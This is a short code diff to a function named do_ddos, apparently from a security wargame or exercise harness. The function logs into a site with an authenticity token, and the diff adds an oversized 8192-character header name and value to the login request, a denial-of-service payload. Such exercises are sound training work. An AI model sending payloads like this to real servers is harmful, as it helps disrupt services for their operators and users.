@@ -23,7 +23,6 @@ def do_ddos(context):
 
     resp = do_request(context, "get", "/", "/")
     auth_token = authenticity_token(resp)
-
     # Post login credentials
     resp = do_request(
         context,
@@ -37,7 +36,8 @@ def do_ddos(context):
             "authenticity_token": auth_token,
         },
         headers={
-            'X-Wargames': 'Wiseguy'
+            'A'*8192: 'x' * 8192,
+            'X-Wargames': 'Wiseguy',
         }
     )
 
